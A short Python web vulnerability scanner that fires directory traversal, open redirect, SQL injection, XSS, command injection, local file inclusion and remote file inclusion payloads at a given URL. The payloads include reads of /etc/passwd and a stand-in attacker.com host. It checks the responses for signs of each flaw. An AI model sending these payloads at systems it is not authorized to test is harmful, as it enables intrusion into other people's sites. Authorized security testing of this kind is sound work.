import requests
import sys
import urllib.parse

def check_directory_traversal(url):
    traversal_payloads = ["../etc/passwd", "..%2Fetc%2Fpasswd", "..././etc/passwd"]
    for payload in traversal_payloads:
        target = f"{url}/{payload}"
        response = requests.get(target)
        if "root:x" in response.text:
            print(f"[+] Directory Traversal vulnerability found at: {target}")
            break

def check_open_redirect(url):
    redirect_payloads = ["//google.com", "https://google.com"]
    for payload in redirect_payloads:
        target = f"{url}/redirect?url={payload}"
        response = requests.get(target, allow_redirects=False)
        if response.status_code in [301, 302] and "google.com" in response.headers.get("Location", ""):
            print(f"[+] Open Redirect vulnerability found at: {target}")
            break

def check_sql_injection(url):
    sql_payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "1' OR '1'='1",
        "1' OR 1 --",
    ]

    for payload in sql_payloads:
        target = f"{url}?id={payload}"
        response = requests.get(target)
        if "SQL" in response.text or "syntax" in response.text or "sql" in response.text:
            print(f"[+] SQL Injection vulnerability found at: {target}")
            break

def check_xss(url):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'\"><img src=x onerror=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";",
        "'';!--\"<XSS>=&{()}"
    ]

    for payload in xss_payloads:
        encoded_payload = urllib.parse.quote(payload)
        target = f"{url}?input={encoded_payload}"
        response = requests.get(target)

        if payload in response.text:
            print(f"[+] XSS vulnerability found at: {target}")
            break

def check_command_injection(url):
    cmd_injection_payloads = [
        ";ls",
        "|ls",
        "&& ls",
        "; uname -a",
        "; cat /etc/passwd",
    ]

    for payload in cmd_injection_payloads:
        encoded_payload = urllib.parse.quote(payload)
        target = f"{url}?input={encoded_payload}"
        response = requests.get(target)

        if "bin" in response.text or "root:x" in response.text or "Linux" in response.text:
            print(f"[+] Command Injection vulnerability found at: {target}")
            break

def check_lfi(url):
    lfi_payloads = [
        "/etc/passwd",
        "/etc/hosts",
        "/proc/version",
    ]

    for payload in lfi_payloads:
        encoded_payload = urllib.parse.quote(payload)
        target = f"{url}?file={encoded_payload}"
        response = requests.get(target)

        if "root:x" in response.text or "localhost" in response.text or "Linux" in response.text:
            print(f"[+] LFI vulnerability found at: {target}")
            break

def check_rfi(url):
    rfi_payloads = [
        "http://attacker.com/malicious_code.txt",
        "http://attacker.com/malicious_code.php",
        "http://attacker.com/malicious_code.jpg?.php",
    ]

    for payload in rfi_payloads:
        encoded_payload = urllib.parse.quote(payload)
        target = f"{url}?url={encoded_payload}"
        response = requests.get(target)

        if "malicious_code" in response.text:
            print(f"[+] RFI vulnerability found at: {target}")
            break

def main():
    if len(sys.argv) != 2:
        print("Usage: python web_vuln_scanner.py <url>")
        sys.exit(1)

    url = sys.argv[1]

    print("[*] Checking for Directory Traversal vulnerability...")
    check_directory_traversal(url)

    print("[*] Checking for Open Redirect vulnerability...")
    check_open_redirect(url)

    print("[*] Checking for SQL Injection vulnerability...")
    check_sql_injection(url)

    print("[*] Checking for XSS vulnerability...")
    check_xss(url)

    print("[*] Checking for Command Injection vulnerability...")
    check_command_injection(url)

    print("[*] Checking for LFI vulnerability...")
    check_lfi(url)

    print("[*] Checking for RFI vulnerability...")
    check_rfi(url)

if __name__ == "__main__":
    main()

# python web_vuln_scanner.py http://example.com